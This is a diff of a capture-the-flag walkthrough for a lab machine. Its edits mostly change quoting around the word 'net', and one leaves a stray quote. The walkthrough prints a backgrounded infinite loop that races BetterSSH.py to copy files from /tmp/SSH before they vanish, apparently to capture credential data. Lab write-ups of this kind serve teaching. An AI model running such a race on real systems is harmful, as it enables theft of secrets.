@@ -761,9 +761,9 @@ So what we now have here is a race with `BetterSSH.py`: we need to grab the copy
 
 Can we do that? Absolutely! 
 
-First, let's create a perpetual loop that would constantly copy everything from `/tmp/SSH/` to a convenient directory of our choosing, say `/home/robert/net`. (Because this loop is the `net` that will catch our `fish` ;))
+First, let's create a perpetual loop that would constantly copy everything from `/tmp/SSH/` to a convenient directory of our choosing, say `/home/robert/net`. (Because this loop is the net' that will catch our 'fish' ;))
 
-Our `net` will look like this: `while true;do cp -r /tmp/SSH /home/robert/net;done &` (FYI, the `&` at the end of the command backgrounds our command):
+Our 'net' will look like this: `while true;do cp -r /tmp/SSH /home/robert/net;done &` (FYI, the `&` at the end of the command backgrounds our command):
 ```
 robert@obscure:~$ mkdir net
 robert@obscure:~$ ls -l
@@ -778,7 +778,7 @@ drwxrwxr-x 2 robert robert 4096 May 29 10:58 net
 robert@obscure:~$ while true;do cp -r /tmp/SSH /home/robert/net;done &
 [1] 28190
 ```
-`[1] 28190` is the `pid` of our backgrounded command. Our net is ready.
+`[1] 28190` is the `pid` of our backgrounded command. Our 'net' is ready.
 
 We run `BetterSSH.py`:
 ```
